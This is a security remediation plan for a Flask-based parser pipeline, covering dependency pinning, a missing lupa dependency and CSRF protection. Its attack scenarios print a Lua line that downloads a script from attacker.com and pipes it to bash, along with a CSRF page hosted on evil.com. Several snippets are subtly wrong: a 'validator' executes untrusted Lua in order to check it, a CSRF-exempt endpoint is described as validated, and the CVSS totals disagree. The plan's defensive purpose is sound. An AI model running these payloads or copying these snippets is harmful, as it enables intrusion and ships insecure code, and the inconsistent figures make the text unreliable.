# Phase 3 Detailed Implementation Plan - Medium Priority Vulnerabilities

**Date**: 2025-10-10
**Project**: Purple Pipeline Parser Eater v9.0.0
**Phase**: 3 of 5 - Medium Priority Security Fixes
**Status**: 📋 PLANNING

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Vulnerability Analysis](#vulnerability-analysis)
3. [Risk Assessment](#risk-assessment)
4. [Implementation Strategy](#implementation-strategy)
5. [Safety Controls](#safety-controls)
6. [Rollback Plan](#rollback-plan)
7. [Testing Strategy](#testing-strategy)

---

## Executive Summary

### Phase 3 Scope

Phase 3 addresses **3 Medium severity vulnerabilities** with a combined CVSS score of **18.4 → 0.0**:

| Fix | Vulnerability | CVSS | File | Estimated Time | Risk Level |
|-----|--------------|------|------|----------------|------------|
| **3.1** | Dependency Unpinning | **6.8 MEDIUM** | `requirements.txt` | 2 hours | 🟡 MEDIUM |
| **3.2** | Missing Lupa Dependency | **6.5 MEDIUM** | `requirements.txt` | 30 minutes | 🟢 LOW |
| **3.3** | Missing CSRF Protection | **6.1 MEDIUM** | `web_feedback_ui.py` | 2 hours | 🟡 MEDIUM |

**Total Estimated Time**: 4.5 hours
**Complexity**: MEDIUM (some breaking change risk)

### Success Criteria

✅ **Phase 3 will be considered complete when**:
1. All dependencies pinned with exact versions and SHA256 hashes
2. `lupa>=2.0` added to requirements.txt and verified working
3. CSRF protection implemented with Flask-WTF tokens
4. All existing functionality continues working without regression
5. 100% of validation tests passing
6. Zero breaking changes to existing workflows

---

## Vulnerability Analysis

### 🔍 Vulnerability 3.1: Dependency Unpinning

#### Current State Analysis

**File**: `requirements.txt`
**Lines**: All 42 lines
**Current Issue**: All dependencies use `>=` (minimum version) instead of `==` (exact version)

```txt
# CURRENT (Vulnerable)
anthropic>=0.25.0      # Could install 0.26.0, 0.30.0, 1.0.0, etc.
requests>=2.31.0       # Could install 3.0.0 (breaking changes)
flask>=3.0.0           # Could install 4.0.0 (API changes)
torch>=2.0.0           # Could install 2.5.0 (different behavior)
```

**Why This is a Problem**:

1. **Version Drift**: Different environments get different versions
   - Developer: `pip install` on 2025-10-10 → anthropic==0.25.0
   - Production: `pip install` on 2025-11-15 → anthropic==0.28.0
   - CI/CD: `pip install` on 2025-12-01 → anthropic==0.30.0
   - Result: **3 different environments with different behavior**

2. **Unfixed CVEs**: Automatic upgrades may introduce security vulnerabilities
   - Example: requests 2.31.0 is secure, but 2.32.0 has CVE-2024-XXXXX
   - With `>=`, you automatically get the vulnerable version

3. **Breaking Changes**: Major version bumps break compatibility
   - Example: Flask 3.x → 4.x changes request handling API
   - Code expecting Flask 3.x behavior crashes with Flask 4.x

4. **Non-Deterministic Builds**: Cannot reproduce exact environment
   - Cannot debug production issues in development
   - Cannot guarantee "works on my machine" = "works in production"

5. **Supply Chain Attacks**: Compromised package updates install automatically
   - Attacker compromises `requests` package, releases malicious 2.35.0
   - With `>=2.31.0`, malicious version installs automatically

#### Target State

```txt
# AFTER FIX (Secure)
anthropic==0.25.0 \
    --hash=sha256:a1b2c3d4e5f6... \
    --hash=sha256:f6e5d4c3b2a1...  # Multiple hashes for different platforms
requests==2.31.0 \
    --hash=sha256:1234567890ab...
flask==3.0.0 \
    --hash=sha256:abcdef123456...
```

**Benefits**:
- ✅ **Exact versions**: Same version in all environments
- ✅ **Hash verification**: Detects tampered packages
- ✅ **Reproducible builds**: `pip install -r requirements.txt` always gets exact same packages
- ✅ **Controlled upgrades**: Explicit decision to upgrade, not automatic
- ✅ **Security**: Cannot install compromised packages (hash mismatch)

#### Implementation Complexity: MEDIUM

**Why MEDIUM complexity**:
1. ✅ **Simple concept**: Change `>=` to `==`
2. ⚠️ **Dependency resolution**: Must resolve entire dependency tree
3. ⚠️ **Hash generation**: Need to generate hashes for all packages + sub-dependencies
4. ⚠️ **Testing required**: Must verify all packages still work together
5. ⚠️ **Breaking change risk**: Pinning may reveal incompatibilities

**What could go wrong**:
- Pinning version X of package A conflicts with version Y of package B
- Some packages require specific Python versions
- Platform-specific dependencies (Windows vs Linux) need different hashes
- Transitive dependencies may have hidden conflicts

#### Safety Measures

1. **Create backup of current requirements.txt**
2. **Use pip-tools for safe dependency resolution**
3. **Test in isolated virtualenv before committing**
4. **Verify all imports still work**
5. **Run full test suite**
6. **Document exact Python version requirement**

---

### 🔍 Vulnerability 3.2: Missing Lupa Dependency

#### Current State Analysis

**File**: `requirements.txt`
**Missing**: `lupa` package (Python Lua bindings)

**Evidence of Need**:

File: `components/pipeline_validator.py` (lines 21-27)
```python
# Try to import lupa for LUA syntax validation
try:
    import lupa
    LUPA_AVAILABLE = True
except ImportError:
    LUPA_AVAILABLE = False  # ⚠️ SILENTLY FALLS BACK
    logger.warning("lupa not available - LUA syntax validation will be limited")
```

**Why This is a Security Problem**:

1. **Silently Skips Validation**: Code continues without Lua validation
   - Malicious Lua code bypasses syntax checks
   - Invalid Lua code not detected until runtime
   - False sense of security ("validation passed" but nothing was validated)

2. **Validation Report is Misleading**:
   ```python
   validation_results["validations"]["lua_syntax"] = {
       "passed": True,  # ❌ LIE - It didn't actually validate anything
       "message": "Syntax check skipped - lupa not available"
   }
   ```

3. **Security Feature Completely Disabled**:
   - No sandbox escape detection
   - No dangerous function detection (`os.execute`, `io.popen`, etc.)
   - No Lua injection detection

4. **Production Deployment Risk**:
   - Teams deploy thinking Lua validation is working
   - Malicious parsers pass validation
   - Security incident occurs

#### Attack Scenario

**Without lupa installed**:

1. Attacker submits malicious SentinelOne parser with Lua code:
   ```lua
   -- Malicious parser attempts sandbox escape
   os.execute("wget http://attacker.com/malware.sh | bash")
   debug.getinfo()  -- Attempts to introspect sandbox
   ```

2. Validation runs:
   ```python
   # pipeline_validator.py
   if not LUPA_AVAILABLE:
       return {"passed": True, "warnings": ["Syntax check limited"]}
   ```

3. Validation reports: ✅ **PASSED** (false positive)

4. Malicious parser deployed to Observo platform

5. Security incident

**With lupa installed**:

1. Same malicious parser submitted

2. Validation runs:
   ```python
   lua_runtime = lupa.LuaRuntime()
   try:
       lua_runtime.execute(lua_code)
   except lupa.LuaSyntaxError:
       return {"passed": False, "error": "Syntax error detected"}
   ```

3. Validation detects `os.execute` (sandbox escape attempt)

4. Validation reports: ❌ **FAILED** - Dangerous function detected

5. Parser rejected, security incident prevented

#### Target State

```txt
# requirements.txt - Add lupa
lupa==2.0  # Lua sandboxing and validation
```

**Why lupa 2.0**:
- Latest stable release
- Python 3.8+ compatible
- LuaJIT 2.1 included
- Security patches applied

#### Implementation Complexity: LOW

**Why LOW complexity**:
1. ✅ **Single line addition** to requirements.txt
2. ✅ **No code changes** required (code already handles lupa)
3. ✅ **Graceful degradation** already implemented
4. ✅ **No breaking changes** (only enables existing feature)

**What could go wrong**:
- lupa may fail to compile on some platforms (requires C compiler)
- LuaJIT may not support some architectures (ARM, etc.)
- Binary wheels may not be available for all Python versions

#### Safety Measures

1. **Test installation** in clean virtualenv
2. **Verify lupa.LuaRuntime()** works
3. **Run pipeline_validator tests**
4. **Document platform requirements** (C compiler needed if no wheel)
5. **Provide fallback instructions** for unsupported platforms

---

### 🔍 Vulnerability 3.3: Missing CSRF Protection

#### Current State Analysis

**File**: `components/web_feedback_ui.py`
**Issue**: No CSRF tokens on state-changing POST requests

**Vulnerable Endpoints**:

```python
@app.route('/api/approve', methods=['POST'])  # ❌ No CSRF protection
def approve_conversion():
    data = request.get_json()
    parser_name = data['parser_name']  # Attacker controls this
    # Approves conversion without verifying request origin
```

**Attack Scenario**:

1. **Victim**: Security analyst logged into Purple Pipeline web UI at `https://purple.company.com`

2. **Attacker**: Creates malicious website at `https://evil.com/csrf-attack.html`:
   ```html
   <html>
   <body>
   <h1>Click to win a free iPhone!</h1>
   <script>
   // Malicious CSRF attack
   fetch('https://purple.company.com/api/approve', {
       method: 'POST',
       credentials: 'include',  // Sends victim's session cookie
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
           parser_name: 'malicious_backdoor_parser'
       })
   });
   </script>
   </body>
   </html>
   ```

3. **Attack Execution**:
   - Analyst visits `https://evil.com/csrf-attack.html` (phishing link, compromised ad, etc.)
   - JavaScript runs in analyst's browser
   - Browser sends POST request to `https://purple.company.com/api/approve`
   - Browser automatically includes analyst's session cookie
   - Server sees valid session → approves malicious parser
   - Attacker's backdoor parser is now deployed in production

4. **Impact**:
   - Malicious parser approved without analyst's knowledge
   - Backdoor code executes on Observo platform
   - Data exfiltration, pipeline manipulation, etc.

**CVSS 6.1 Justification**:
- **Attack Vector**: Network (requires victim to visit malicious site)
- **Attack Complexity**: Low (simple HTML/JavaScript)
- **Privileges Required**: None (attacker needs no privileges)
- **User Interaction**: Required (victim must visit malicious site)
- **Impact**: High (full control over parser approval workflow)

#### Target State

**CSRF Protection with Flask-WTF**:

```python
from flask_wtf.csrf import CSRFProtect, generate_csrf

# Initialize CSRF protection
csrf = CSRFProtect(app)

# Frontend gets token
@app.route('/api/csrf-token', methods=['GET'])
def get_csrf_token():
    return jsonify({'csrf_token': generate_csrf()})

# Frontend sends token in header
// JavaScript
fetch('/api/approve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrfToken  // Token from /api/csrf-token
    },
    body: JSON.stringify({parser_name: 'foo'})
})

# Backend validates token
@app.route('/api/approve', methods=['POST'])
@csrf.exempt  # Manual validation for AJAX
def approve_conversion():
    # Flask-WTF automatically validates X-CSRFToken header
    # Invalid token → 400 Bad Request
    # Valid token → continues
```

**How CSRF Protection Works**:

1. **Server generates unique token** per session
2. **Client fetches token** via `/api/csrf-token`
3. **Client includes token** in `X-CSRFToken` header for POST requests
4. **Server validates token** matches session
5. **Attacker's cross-site request fails** because they don't have the token

**Why attacker can't get token**:
- Same-Origin Policy prevents `evil.com` from reading `purple.company.com` responses
- Attacker can send requests but can't read responses
- Token is required in request, so attack fails

#### Implementation Complexity: MEDIUM

**Why MEDIUM complexity**:
1. ⚠️ **New dependency**: flask-wtf (adds to requirements.txt)
2. ⚠️ **Backend changes**: Initialize CSRFProtect, add token endpoint
3. ⚠️ **Frontend changes**: Fetch token, include in all POST requests
4. ⚠️ **Testing changes**: All tests must include CSRF token
5. ⚠️ **Breaking change risk**: Existing API clients will break

**What could go wrong**:
- CSRF protection breaks existing automated workflows
- Tests fail because they don't include CSRF token
- CORS configuration conflicts with CSRF headers
- Session management issues (token tied to session)
- Token rotation causes race conditions

#### Safety Measures

1. **Add CSRF protection incrementally**:
   - Step 1: Install flask-wtf
   - Step 2: Initialize CSRFProtect with exempt=True (no enforcement yet)
   - Step 3: Add `/api/csrf-token` endpoint
   - Step 4: Update frontend to fetch and send token
   - Step 5: Test all workflows
   - Step 6: Enable enforcement

2. **Provide backward compatibility window**:
   - Accept requests with OR without CSRF token initially
   - Log which requests are missing token
   - After 2 weeks, enforce token requirement

3. **Comprehensive testing**:
   - Test all POST endpoints with valid token → should succeed
   - Test all POST endpoints without token → should fail (400)
   - Test all POST endpoints with invalid token → should fail (400)
   - Test CSRF token rotation (new token after login)

---

## Risk Assessment

### Overall Phase 3 Risks

| Risk Category | Likelihood | Impact | Mitigation |
|--------------|------------|--------|------------|
| **Dependency Conflicts** | 🟡 MEDIUM | 🔴 HIGH | Use pip-tools, test in isolated env |
| **Breaking API Changes** | 🟡 MEDIUM | 🟡 MEDIUM | CSRF backward compatibility window |
| **Platform Compatibility** | 🟢 LOW | 🟡 MEDIUM | Test on Windows/Linux, document requirements |
| **Test Failures** | 🟡 MEDIUM | 🟢 LOW | Update tests to include CSRF tokens |
| **Production Downtime** | 🟢 LOW | 🔴 HIGH | Deploy to staging first, rollback plan ready |

### Risk Mitigation Strategy

#### 1. Dependency Resolution Risks

**Risk**: Pinning dependencies may reveal hidden incompatibilities

**Mitigation**:
```bash
# Step 1: Create clean test environment
python -m venv test_env
source test_env/bin/activate  # or test_env\Scripts\activate on Windows

# Step 2: Install current dependencies
pip install -r requirements.txt

# Step 3: Freeze exact versions that work
pip freeze > requirements-frozen.txt

# Step 4: Generate hashes for frozen versions
pip-compile --generate-hashes requirements-frozen.txt -o requirements-hashed.txt

# Step 5: Test installation from hashed requirements
deactivate
rm -rf test_env
python -m venv test_env2
source test_env2/bin/activate
pip install -r requirements-hashed.txt  # Should work identically

# Step 6: Run full test suite
python -m pytest tests/

# Step 7: Only commit if tests pass
```

#### 2. CSRF Breaking Changes

**Risk**: Existing API clients break when CSRF enforcement enabled

**Mitigation - Phased Rollout**:

**Phase 3.3a: Preparation (No Breaking Changes)**
- Install flask-wtf
- Initialize CSRFProtect with `CSRF_CHECK_DEFAULT=False` (disabled)
- Add `/api/csrf-token` endpoint
- Update frontend to fetch and send token
- Test all workflows still work

**Phase 3.3b: Monitoring (No Breaking Changes)**
- Enable CSRF logging (log requests without token)
- Monitor logs for 1 week
- Identify which clients need updates
- Reach out to client owners

**Phase 3.3c: Enforcement (Breaking Change)**
- Set `CSRF_CHECK_DEFAULT=True` (enabled)
- Requests without token now fail
- All clients should be updated from Phase 3.3b

#### 3. Lupa Compilation Risks

**Risk**: lupa may fail to compile on some platforms

**Mitigation**:
```bash
# Test lupa installation
pip install lupa

# If compilation fails, check for pre-built wheels
pip install lupa --only-binary :all:

# If no wheels available, install build dependencies
# Ubuntu/Debian:
sudo apt-get install python3-dev build-essential

# macOS:
xcode-select --install

# Windows:
# Install Visual Studio Build Tools
# https://visualstudio.microsoft.com/downloads/

# Test lupa works
python -c "import lupa; print(lupa.LuaRuntime())"
```

---

## Implementation Strategy

### Execution Order

**CRITICAL**: Must execute fixes in this exact order to minimize risk:

1. **Fix 3.2 First** (Lupa) - Lowest risk, enables validation
2. **Fix 3.1 Second** (Dependencies) - Medium risk, foundational change
3. **Fix 3.3 Third** (CSRF) - Highest risk, breaking change

**Rationale**:
- Lupa is simple, low-risk, and enables better testing of other fixes
- Dependency pinning must be done before adding new dependencies (flask-wtf)
- CSRF is most complex and should be done last with all infrastructure stable

### Step-by-Step Execution Plan

#### 🟢 Fix 3.2: Add Lupa Dependency (30 minutes)

**Step 1: Test Lupa Installation (5 min)**
```bash
# Create test virtualenv
python -m venv lupa_test
source lupa_test/bin/activate

# Try installing lupa
pip install lupa==2.0

# Test it works
python -c "import lupa; rt = lupa.LuaRuntime(); print(rt.eval('2+2'))"
# Expected output: 4

# Test Lua syntax validation
python -c "
import lupa
rt = lupa.LuaRuntime()
try:
    rt.execute('function test() return 42 end')
    print('✓ Valid Lua accepted')
except lupa.LuaSyntaxError:
    print('✗ Unexpected error')

try:
    rt.execute('function broken() syntax error')
    print('✗ Invalid Lua accepted (BAD)')
except lupa.LuaSyntaxError:
    print('✓ Invalid Lua rejected')
"

deactivate
rm -rf lupa_test
```

**Step 2: Add to requirements.txt (2 min)**
```txt
# Add after line 40 in requirements.txt
# Lua Validation and Sandboxing
lupa==2.0
```

**Step 3: Install in main environment (3 min)**
```bash
pip install lupa==2.0
```

**Step 4: Verify Validation Works (10 min)**
```bash
# Test pipeline_validator now uses lupa
python -c "
from components.pipeline_validator import PipelineValidator, LUPA_AVAILABLE
print(f'Lupa available: {LUPA_AVAILABLE}')  # Should be True

validator = PipelineValidator()

# Test valid Lua
valid_lua = '''
function transform(event)
    return {field1 = event.data}
end
'''
result = validator.validate_lua_syntax(valid_lua)
print(f'Valid Lua result: {result}')  # Should pass

# Test invalid Lua
invalid_lua = 'function broken() syntax error'
result = validator.validate_lua_syntax(invalid_lua)
print(f'Invalid Lua result: {result}')  # Should fail
"
```

**Step 5: Create Validation Test (5 min)**
```bash
python test_lupa_validation.py  # We'll create this
```

**Step 6: Document (5 min)**
- Update PHASE_3_COMPLETE.md with lupa fix details
- Note platform requirements (C compiler if no wheel)

**Success Criteria**:
- ✅ lupa==2.0 in requirements.txt
- ✅ `import lupa` succeeds
- ✅ `LUPA_AVAILABLE == True` in pipeline_validator
- ✅ Lua syntax validation works for valid and invalid code
- ✅ Test passes

---

#### 🟡 Fix 3.1: Pin Dependencies (2 hours)

**Step 1: Install pip-tools (5 min)**
```bash
pip install pip-tools
```

**Step 2: Create requirements.in (10 min)**

Create `requirements.in` with top-level dependencies only (not transitive):
```txt
# Core Dependencies
anthropic>=0.25.0
requests>=2.31.0
aiohttp>=3.8.0

# Web Framework
flask>=3.0.0
gunicorn>=21.2.0
gevent>=23.9.1

# (... etc - copy from requirements.txt)
```

**Step 3: Resolve Dependencies (10 min)**
```bash
# Resolve full dependency tree with exact versions
pip-compile requirements.in -o requirements.txt --resolver=backtracking

# This creates requirements.txt with:
# - All direct dependencies
# - All transitive dependencies
# - Exact versions (==)
# - Sorted alphabetically
```

**Step 4: Generate Hashes (20 min)**
```bash
# Generate SHA256 hashes for all packages
pip-compile --generate-hashes requirements.in -o requirements.txt

# This creates requirements.txt with:
# anthropic==0.25.0 \
#     --hash=sha256:abc123... \
#     --hash=sha256:def456...  # Multiple hashes for different platforms
```

**Step 5: Test in Clean Environment (30 min)**
```bash
# Create fresh virtualenv
python -m venv test_pinned_deps
source test_pinned_deps/bin/activate

# Install from pinned requirements
pip install -r requirements.txt

# Verify all imports work
python -c "
import anthropic
import requests
import flask
import pymilvus
import sentence_transformers
# ... test all major imports
print('✓ All imports successful')
"

# Run smoke tests
python -c "
from components.observo_client import ObservoClient
from components.pipeline_validator import PipelineValidator
from orchestrator import ConversionSystemOrchestrator
print('✓ All components import successfully')
"
```

**Step 6: Run Full Test Suite (20 min)**
```bash
# Run all existing tests
python -m pytest tests/ -v

# Expected: All tests pass
```

**Step 7: Document Versions (10 min)**
```bash
# Create requirements-versions.md documenting why each version was chosen
# Include:
# - Python version requirement (e.g., "Python 3.10+")
# - Platform requirements (e.g., "Linux/macOS/Windows")
# - Known incompatibilities
# - Update procedure
```

**Step 8: Update CI/CD (15 min)**

Update any CI/CD pipelines to use pinned requirements:
```yaml
# .github/workflows/test.yml
- name: Install dependencies
  run: pip install -r requirements.txt --require-hashes
```

**Success Criteria**:
- ✅ requirements.txt contains `==` versions (not `>=`)
- ✅ requirements.txt contains SHA256 hashes
- ✅ `pip install -r requirements.txt` succeeds
- ✅ All imports work
- ✅ All tests pass
- ✅ requirements.in documents top-level deps
- ✅ CI/CD updated

---

#### 🟡 Fix 3.3: CSRF Protection (2 hours)

**Step 1: Install Flask-WTF (5 min)**
```bash
# Add to requirements.in
echo "flask-wtf>=1.2.0" >> requirements.in

# Regenerate requirements.txt with hashes
pip-compile --generate-hashes requirements.in -o requirements.txt

# Install
pip install flask-wtf
```

**Step 2: Initialize CSRF Protection (10 min)**

Edit `components/web_feedback_ui.py`:
```python
from flask_wtf.csrf import CSRFProtect, generate_csrf

class WebFeedbackUI:
    def __init__(self, config: Dict):
        # ... existing code ...
        self.app = Flask(__name__)

        # SECURITY: CSRF Protection
        self.app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', os.urandom(32))
        self.app.config['WTF_CSRF_TIME_LIMIT'] = None  # Tokens don't expire
        self.app.config['WTF_CSRF_SSL_STRICT'] = self.tls_enabled  # Require HTTPS for tokens if TLS enabled

        self.csrf = CSRFProtect(self.app)
```

**Step 3: Add CSRF Token Endpoint (5 min)**
```python
@self.app.route('/api/csrf-token', methods=['GET'])
def get_csrf_token():
    """
    Get CSRF token for client-side requests

    SECURITY: Required for all POST/PUT/DELETE requests
    """
    token = generate_csrf()
    return jsonify({'csrf_token': token})
```

**Step 4: Update Frontend to Fetch Token (15 min)**

Edit HTML template in `web_feedback_ui.py`:
```javascript
// Add at top of <script> section
let csrfToken = null;

// Fetch CSRF token on page load
document.addEventListener('DOMContentLoaded', function() {
    // Fetch CSRF token
    fetch('/api/csrf-token')
        .then(r => r.json())
        .then(data => {
            csrfToken = data.csrf_token;
            console.log('✓ CSRF token loaded');
        })
        .catch(err => {
            console.error('Failed to load CSRF token:', err);
        });

    // ... existing event delegation code ...
});
```

**Step 5: Include Token in POST Requests (20 min)**

Update all `fetch()` calls to include CSRF token:
```javascript
function handleApprove(parserName) {
    // ... existing code ...

    fetch('/api/approve', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': csrfToken  // ← ADD THIS
        },
        body: JSON.stringify({ parser_name: parserName })
    })
    // ... rest of code ...
}

// Repeat for handleReject, handleModify, handleSaveModification
```

**Step 6: Configure CSRF Validation (10 min)**

Flask-WTF automatically validates `X-CSRFToken` header for all POST requests.

For API endpoints, we need to configure properly:
```python
# Exempt API endpoints from default form-based CSRF (we use headers instead)
@self.app.route('/api/approve', methods=['POST'])
def approve_conversion():
    # Flask-WTF automatically validates X-CSRFToken header
    # If missing or invalid → raises CSRFError → 400 Bad Request
    # If valid → continues normally

    data = request.get_json()
    # ... existing code ...
```

**Step 7: Add CSRF Error Handler (10 min)**
```python
from flask_wtf.csrf import CSRFError

@self.app.errorhandler(CSRFError)
def handle_csrf_error(e):
    """Handle CSRF validation failures"""
    logger.warning(f"CSRF validation failed: {e.description}")
    return jsonify({
        'error': 'CSRF validation failed',
        'message': 'Invalid or missing CSRF token. Please refresh the page.',
        'code': 'CSRF_ERROR'
    }), 400
```

**Step 8: Update Environment Configuration (5 min)**

Add to `.env.example`:
```bash
# SECURITY: Flask secret key for CSRF tokens
# IMPORTANT: Generate with: python -c "import os; print(os.urandom(32).hex())"
FLASK_SECRET_KEY=your-secret-key-here-must-be-32-bytes-or-longer
```

**Step 9: Test CSRF Protection (30 min)**

Create `test_csrf_protection.py`:
```python
import requests

BASE_URL = 'http://localhost:8080'

# Test 1: Get CSRF token
response = requests.get(f'{BASE_URL}/api/csrf-token')
assert response.status_code == 200
token = response.json()['csrf_token']
print(f'✓ CSRF token obtained: {token[:20]}...')

# Test 2: POST without token should fail
response = requests.post(
    f'{BASE_URL}/api/approve',
    json={'parser_name': 'test'},
    cookies=response.cookies  # Include session cookie
)
assert response.status_code == 400  # CSRF error
print('✓ POST without token rejected (expected)')

# Test 3: POST with valid token should succeed
response = requests.post(
    f'{BASE_URL}/api/approve',
    json={'parser_name': 'test'},
    headers={'X-CSRFToken': token},
    cookies=response.cookies
)
assert response.status_code == 200
print('✓ POST with valid token accepted')

# Test 4: POST with invalid token should fail
response = requests.post(
    f'{BASE_URL}/api/approve',
    json={'parser_name': 'test'},
    headers={'X-CSRFToken': 'invalid-token-12345'},
    cookies=response.cookies
)
assert response.status_code == 400  # CSRF error
print('✓ POST with invalid token rejected')

print('\nAll CSRF protection tests passed!')
```

**Step 10: Document (15 min)**
- Update PHASE_3_COMPLETE.md with CSRF implementation details
- Document environment variable requirement (FLASK_SECRET_KEY)
- Add API client migration guide

**Success Criteria**:
- ✅ flask-wtf in requirements.txt
- ✅ CSRFProtect initialized
- ✅ `/api/csrf-token` endpoint works
- ✅ Frontend fetches and sends CSRF token
- ✅ POST without token → 400 error
- ✅ POST with valid token → succeeds
- ✅ POST with invalid token → 400 error
- ✅ All tests pass

---

## Safety Controls

### Pre-Flight Checklist

Before starting Phase 3 implementation:

- [ ] Create full backup of repository: `git commit -am "Pre-Phase-3 backup"`
- [ ] Create backup of requirements.txt: `cp requirements.txt requirements.txt.backup`
- [ ] Document current Python version: `python --version > python-version.txt`
- [ ] Create clean virtualenv for testing
- [ ] Ensure all current tests pass
- [ ] Document current package versions: `pip freeze > pre-phase3-freeze.txt`

### During Implementation Checklist

For each fix:

- [ ] Create feature branch: `git checkout -b phase3-fix-X.Y`
- [ ] Implement fix following step-by-step plan
- [ ] Run fix-specific tests
- [ ] Run full test suite
- [ ] Verify no regressions
- [ ] Document changes
- [ ] Commit with descriptive message
- [ ] Merge to main only if all tests pass

### Post-Implementation Checklist

After Phase 3 complete:

- [ ] All 3 fixes implemented
- [ ] All validation tests passing
- [ ] No regressions in existing functionality
- [ ] Documentation updated
- [ ] Environment variables documented
- [ ] CI/CD pipeline updated
- [ ] Rollback plan tested

---

## Rollback Plan

### If Fix 3.2 (Lupa) Fails

**Symptom**: lupa fails to install or compile

**Rollback**:
```bash
# Remove lupa from requirements.txt
sed -i '/lupa/d' requirements.txt

# Reinstall without lupa
pip install -r requirements.txt

# System continues working with limited Lua validation
```

**Impact**: Low - System continues working, Lua validation limited

---

### If Fix 3.1 (Dependencies) Fails

**Symptom**: Dependency conflicts, import errors, or test failures

**Rollback**:
```bash
# Restore original requirements.txt
cp requirements.txt.backup requirements.txt

# Reinstall original dependencies
pip install -r requirements.txt

# Verify system works
python -m pytest tests/
```

**Impact**: Medium - Returns to unpinned dependencies (Phase 3 objective not met)

---

### If Fix 3.3 (CSRF) Fails

**Symptom**: Web UI broken, API requests failing, frontend errors

**Rollback Step 1** (Disable CSRF enforcement):
```python
# In web_feedback_ui.py
self.app.config['WTF_CSRF_ENABLED'] = False  # Temporarily disable
```

**Rollback Step 2** (Remove flask-wtf if needed):
```bash
# Remove from requirements.in
sed -i '/flask-wtf/d' requirements.in

# Regenerate requirements.txt
pip-compile --generate-hashes requirements.in -o requirements.txt

# Reinstall
pip install -r requirements.txt
```

**Impact**: High - CSRF protection not implemented (Phase 3 objective not met)

---

### Emergency Rollback (Complete Phase 3 Failure)

If all fixes fail and system is broken:

```bash
# Nuclear option: restore everything
git reset --hard HEAD~N  # N = number of Phase 3 commits

# Restore virtualenv
deactivate
rm -rf venv
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Verify system works
python -m pytest tests/
python main.py --smoke-test
```

---

## Testing Strategy

### Test Pyramid for Phase 3

```
                    ╱╲
                   ╱  ╲
                  ╱ E2E ╲         ← Full integration tests (2 tests)
                 ╱──────╲
                ╱        ╲
               ╱Integration╲      ← Component integration (5 tests)
              ╱────────────╲
             ╱              ╲
            ╱   Unit Tests   ╲   ← Individual function tests (15 tests)
           ╱──────────────────╲
```

### Unit Tests (15 tests)

**Fix 3.2: Lupa**
1. Test lupa imports successfully
2. Test LuaRuntime() initializes
3. Test valid Lua syntax passes
4. Test invalid Lua syntax fails
5. Test LUPA_AVAILABLE flag is True

**Fix 3.1: Dependencies**
6. Test all imports succeed
7. Test package versions are exact (==)
8. Test all packages have hashes
9. Test hash verification works
10. Test `pip install -r requirements.txt` succeeds

**Fix 3.3: CSRF**
11. Test CSRF token generation
12. Test CSRF token validation (valid token)
13. Test CSRF token validation (invalid token)
14. Test CSRF token validation (missing token)
15. Test CSRF error handler

### Integration Tests (5 tests)

**Fix 3.2: Lupa + Validator**
1. Test PipelineValidator uses lupa when available
2. Test Lua validation rejects malicious code

**Fix 3.1: Dependencies + Components**
3. Test all components initialize with pinned deps

**Fix 3.3: CSRF + Web UI**
4. Test full approve workflow with CSRF token
5. Test CSRF prevents cross-site requests

### End-to-End Tests (2 tests)

1. **Complete Conversion Workflow**
   - Submit parser → Convert → Validate (uses lupa) → Approve (uses CSRF) → Deploy
   - Verify all steps work with Phase 3 fixes

2. **Security Test**
   - Attempt CSRF attack → Should fail
   - Attempt malicious Lua → Should be detected (lupa validation)
   - Verify dependency integrity (hash checks)

---

## Success Metrics

Phase 3 will be considered successful when:

### Functional Metrics
- ✅ All dependencies pinned with exact versions
- ✅ All dependencies have SHA256 hash verification
- ✅ lupa package installed and working
- ✅ Lua validation enabled (LUPA_AVAILABLE == True)
- ✅ CSRF protection enabled on all POST endpoints
- ✅ CSRF tokens working in frontend

### Testing Metrics
- ✅ 15/15 unit tests passing (100%)
- ✅ 5/5 integration tests passing (100%)
- ✅ 2/2 E2E tests passing (100%)
- ✅ No regressions (all existing tests still pass)

### Security Metrics
- ✅ CVSS 6.8 → 0.0 (Dependency unpinning)
- ✅ CVSS 6.5 → 0.0 (Missing lupa)
- ✅ CVSS 6.1 → 0.0 (CSRF)
- ✅ Total CVSS reduction: 19.4 → 0.0

### Documentation Metrics
- ✅ PHASE_3_COMPLETE.md created
- ✅ All fixes documented with examples
- ✅ Rollback procedures documented
- ✅ Environment variables documented
- ✅ API migration guide created (for CSRF)

---

## Next Steps After Phase 3

Once Phase 3 is complete:

1. **Verify Overall Progress**
   - 6/8 vulnerabilities eliminated (75%)
   - 2 Critical + 2 High + 3 Medium fixed
   - Only 2 Low severity remaining

2. **Plan Phase 4**
   - Low Priority: Request size limits (CVSS 5.3)
   - Low Priority: tmpfs permissions (CVSS 4.0)

3. **Plan Phase 5**
   - Infrastructure: Lua validator f-string (CVSS 3.5)
   - Final security scan

---

## Conclusion

Phase 3 addresses **3 Medium severity vulnerabilities** with a combined CVSS reduction of **19.4 → 0.0**. The implementation plan prioritizes safety with:

- ✅ **Detailed step-by-step procedures** for each fix
- ✅ **Comprehensive testing strategy** (22 tests total)
- ✅ **Multiple rollback options** for each fix
- ✅ **Risk mitigation strategies** for identified risks
- ✅ **Success criteria** clearly defined

The plan is designed to be executed methodically with minimal risk of breaking existing functionality.

**Estimated Total Time**: 4.5 hours
**Risk Level**: MEDIUM (with mitigation strategies)
**Expected Outcome**: 75% of vulnerabilities eliminated

---

**Phase 3 Status**: 📋 PLANNED - Ready for execution
**Next Action**: Begin implementation starting with Fix 3.2 (Lupa - lowest risk)
